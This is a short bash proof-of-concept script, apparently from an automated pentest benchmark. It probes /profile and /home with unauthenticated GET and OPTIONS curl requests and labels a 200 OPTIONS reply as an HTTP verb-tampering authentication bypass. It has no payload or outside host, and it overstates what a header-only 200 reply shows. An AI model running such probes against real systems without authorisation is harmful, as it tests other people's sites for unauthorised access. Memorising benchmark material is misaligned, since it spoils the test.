#!/bin/bash
# POC: Demonstrates HTTP OPTIONS method bypassing authentication on protected resources (/profile and /home). Shows that GET requests properly enforce authentication (302 redirect) while OPTIONS requests return 200 OK without authentication checks.
# Target: ./repo
# Created: 2025-11-07T19:08:31.330Z
# Session: benchmark-XBEN-063-24-mhp81tzn

# HTTP OPTIONS Method Authentication Bypass POC
# This script demonstrates how OPTIONS requests bypass authentication on protected resources

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "HTTP OPTIONS Authentication Bypass POC"
echo "=========================================="
echo "Target: $BASE_URL"
echo ""

# Test 1: /profile endpoint
echo "[TEST 1] Testing /profile endpoint"
echo "---"
echo "1a. GET /profile (without auth) - Should redirect to login (302)"
GET_RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$BASE_URL/profile")
GET_CODE=$(echo "$GET_RESPONSE" | tail -n1)
GET_BODY=$(echo "$GET_RESPONSE" | head -n-1)

echo "Response Code: $GET_CODE"
if [[ "$GET_CODE" == "302" ]]; then
    echo "✓ Correctly enforced: GET returns 302 redirect"
    echo "Location header: $(echo "$GET_BODY" | grep -i "Location:" || echo "N/A")"
else
    echo "✗ Unexpected response code"
fi
echo ""

echo "1b. OPTIONS /profile (without auth) - Should be protected but isn't (200)"
OPTIONS_RESPONSE=$(curl -s -w "\n%{http_code}" -X OPTIONS "$BASE_URL/profile" -v 2>&1)
OPTIONS_CODE=$(echo "$OPTIONS_RESPONSE" | tail -n1)
OPTIONS_BODY=$(echo "$OPTIONS_RESPONSE" | head -n-1)

echo "Response Code: $OPTIONS_CODE"
if [[ "$OPTIONS_CODE" == "200" ]]; then
    echo "✗ VULNERABILITY: OPTIONS returns 200 - Authentication BYPASSED!"
    echo "Headers returned:"
    echo "$OPTIONS_BODY" | grep -E "^(<|Allow|Vary|Content)" || echo "$OPTIONS_BODY" | head -20
else
    echo "✓ Protected: OPTIONS returns $OPTIONS_CODE"
fi
echo ""

# Test 2: /home endpoint
echo "[TEST 2] Testing /home endpoint"
echo "---"
echo "2a. GET /home (without auth) - Should redirect to login (302)"
GET_RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$BASE_URL/home")
GET_CODE=$(echo "$GET_RESPONSE" | tail -n1)
GET_BODY=$(echo "$GET_RESPONSE" | head -n-1)

echo "Response Code: $GET_CODE"
if [[ "$GET_CODE" == "302" ]]; then
    echo "✓ Correctly enforced: GET returns 302 redirect"
    echo "Location header: $(echo "$GET_BODY" | grep -i "Location:" || echo "N/A")"
else
    echo "✗ Unexpected response code"
fi
echo ""

echo "2b. OPTIONS /home (without auth) - Should be protected but isn't (200)"
OPTIONS_RESPONSE=$(curl -s -w "\n%{http_code}" -X OPTIONS "$BASE_URL/home" -v 2>&1)
OPTIONS_CODE=$(echo "$OPTIONS_RESPONSE" | tail -n1)
OPTIONS_BODY=$(echo "$OPTIONS_RESPONSE" | head -n-1)

echo "Response Code: $OPTIONS_CODE"
if [[ "$OPTIONS_CODE" == "200" ]]; then
    echo "✗ VULNERABILITY: OPTIONS returns 200 - Authentication BYPASSED!"
    echo "Headers returned:"
    echo "$OPTIONS_BODY" | grep -E "^(<|Allow|Vary|Content)" || echo "$OPTIONS_BODY" | head -20
else
    echo "✓ Protected: OPTIONS returns $OPTIONS_CODE"
fi
echo ""

echo "=========================================="
echo "Summary:"
echo "=========================================="
echo "If both /profile and /home show OPTIONS=200 while GET=302,"
echo "then HTTP verb tampering has successfully bypassed authentication."
echo ""